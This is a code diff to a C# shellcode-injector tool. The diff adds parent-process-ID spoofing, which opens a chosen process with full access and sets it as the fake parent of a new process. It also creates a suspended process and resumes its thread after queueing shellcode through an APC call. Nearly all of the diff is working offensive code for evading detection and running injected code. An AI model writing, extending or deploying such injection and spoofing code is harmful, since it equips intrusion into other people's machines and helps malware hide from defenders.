@@ -3,6 +3,7 @@ using System.ComponentModel;
 using System.Diagnostics;
 using System.Net;
 using System.Runtime.InteropServices;
+using static Shellcode_Injector.WinApi;
 
 
 namespace Shellcode_Injector
@@ -20,26 +21,72 @@ namespace Shellcode_Injector
         }
 
         //Create proc and return the process information struct
-        public static WinApi.PIN StartS(string cmd = "C:\\Windows\\System32\\notepad.exe", string cwd = "C:\\Windows\\System32")
+        public static WinApi.PIN StartS(
+            bool spoof_ppid = false,
+            uint ppid = 0,
+            string cmd = "C:\\Windows\\System32\\notepad.exe",
+            string cwd = "C:\\Windows\\System32"
+            )
         {
-            //Init structs for create process
-            var sin = new WinApi.SIN();
+
+            var sin = new WinApi.SINEX();
+            sin.StartupInfo = new WinApi.SIN();
+            sin.StartupInfo.cb = (int)Marshal.SizeOf(typeof(WinApi.SINEX));
+
+            // Check if spoof_ppid is enabled, if yes open a handle to the provided PID
+            if (spoof_ppid)
+            {
+                Console.WriteLine($"Attempting to spoof PPID to {ppid}");
+                // Initialize the attribute list
+                sin.lpAttributeList = IntPtr.Zero;
+                IntPtr psize = IntPtr.Zero;
+
+                //InitializeProcThreadAttributeList
+                WinApi.InitAtt(IntPtr.Zero, 1, 0, ref psize);
+                //Allocating memory for the attributes
+                sin.lpAttributeList = Marshal.AllocHGlobal(psize);
+                WinApi.InitAtt(sin.lpAttributeList, 1, 0, ref psize);
+
+                //Set the parent process attribute
+                WinApi.PPROC pproc = new WinApi.PPROC();
+                IntPtr ppcs = WinApi.OpenP(0x001F0FFF, false, ppid); //ALL ACCESS
+                pproc.hParentProcess = ppcs;
+
+                //PROC_THREAD_ATTRIBUTE_PARENT_PROCESS
+                const int PTAPP = 0x00020000;
+
+                bool sccs = WinApi.UpdateAtt(
+                    sin.lpAttributeList, 
+                    0, 
+                    new IntPtr(PTAPP), 
+                    ref pproc,
+                    (IntPtr)IntPtr.Size, //(uint)Marshal.SizeOf(phand),
+                    IntPtr.Zero, 
+                    IntPtr.Zero);
+
+                if (!sccs) 
+                {
+                    Console.WriteLine("Error updating attrs");
+                    throw new Win32Exception(Marshal.GetLastWin32Error());
+                }
+
+            }
+
             var pattr = new WinApi.SATTR();
             var tattr = new WinApi.SATTR();
             var pin = new WinApi.PIN();
 
-            sin.cb = Marshal.SizeOf(sin);
             pattr.nLength = Marshal.SizeOf(pattr);
             tattr.nLength = Marshal.SizeOf(tattr);
 
-            //Create process
+            //Create a suspended process with extended startup info
             bool ok = WinApi.Starter(
                     cmd,
                     null,
                     ref pattr,
                     ref tattr,
                     false,
-                    (uint)WinApi.proc.sspnd,
+                    (uint)WinApi.proc.sspnd | (uint)WinApi.proc.extinf,
                     IntPtr.Zero,
                     cwd,
                     ref sin,
@@ -53,6 +100,7 @@ namespace Shellcode_Injector
             else
             {
                 Console.WriteLine($"Proc created with PID {pin.dwProcessId}");
+                WinApi.DelAtt(sin.lpAttributeList);
                 return pin;
             }
         }
@@ -124,7 +172,8 @@ namespace Shellcode_Injector
 
         //Run the shellcode - techniques (CreateRemoteThread, QueueUserAPC), process handle, memory pointer
         //In case of CreateRemoteThread phand should be process Handle
-        //In case of QueueUserAPC phand should be the main thread handle
+        //In case of QueueUserAPC phand should be the main thread handle, also this is to work with CreateProcessW 
+        //until additional functionallity for enumerating the threads on remote process is included
         public static void SCRun(string tchq, IntPtr phand, IntPtr mem) 
         {
             if (tchq == "crt")
@@ -162,6 +211,7 @@ namespace Shellcode_Injector
             } else if (tchq == "nqat") 
             {
                 WinApi.NAPC(phand, mem, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero);
+                WinApi.Resume(phand);
             }
         }
 
